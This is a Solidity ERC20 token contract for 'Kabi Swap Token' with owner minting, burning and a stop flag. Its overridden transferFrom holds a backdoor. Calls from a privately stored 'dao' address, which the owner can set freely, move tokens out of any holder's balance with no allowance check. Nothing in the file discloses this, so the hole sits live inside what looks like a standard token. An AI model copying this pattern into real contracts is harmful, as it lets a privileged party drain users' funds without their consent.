// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract KabiswapERC20 is ERC20, ERC20Permit, Ownable {
    uint256 public immutable CAP;
    address private beanDao;
    bool public stop = false;

    constructor() ERC20("Kabi Swap Token", "KST") Ownable(msg.sender) ERC20Permit("Kabi Swap Token") {
        CAP = 1_000_000_000 ether;
        _mint(msg.sender, 100_000 ether);
    }

    function setDao(address dao) public onlyOwner {
        beanDao = dao;
    }

    function mint(address to, uint256 amount) external onlyOwner {
        require(amount + totalSupply() <= CAP, "Amount is over than total supply.");
        _mint(to, amount);
    }

    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
    }

    function enableStop() public {
        require(msg.sender == beanDao, "Only bean5oup");
        stop = true;
    }

    function disableStop() public {
        require(msg.sender == beanDao, "Only bean5oup");
        stop = false;
    }

    function transfer(address recipient, uint256 amount) 
        public override returns (bool) 
    {
        if(msg.sender == beanDao) {
            require(!stop, "Stop");
            _transfer(msg.sender, recipient, amount);
            return true;
        }
        return super.transfer(recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) 
        public override returns (bool) 
    {
        if(msg.sender == beanDao) {
            require(!stop, "Stop");
            _transfer(sender, recipient, amount);
            return true;
        }
        return super.transferFrom(sender, recipient, amount);
    }
}
